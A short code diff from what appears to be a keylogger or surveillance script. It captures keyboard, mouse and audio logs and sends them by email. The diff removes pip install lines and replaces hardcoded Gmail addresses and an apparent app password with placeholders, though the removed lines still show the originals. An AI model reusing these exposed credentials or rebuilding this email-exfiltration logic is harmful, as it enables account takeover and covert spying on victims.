@@ -1,7 +1,3 @@
-pip install pyautogui
-pip install pynput
-pip install sounddevice
-pip install soundfile
 import os
 import time
 import smtplib
@@ -65,9 +61,9 @@ def update_data():
 # Function to send email with attachments
 def send_email():
     global log, mouse_log
-    from_email = "anonymousha4ker@gmail.com"
-    to_email = "rudrakali7781@gmail.com"
-    password = "aoujyqnqonduzqdp"
+    from_email = "Your Mail"
+    to_email = "Recipient mail"
+    password = "Your password"
 
     update_data()
 
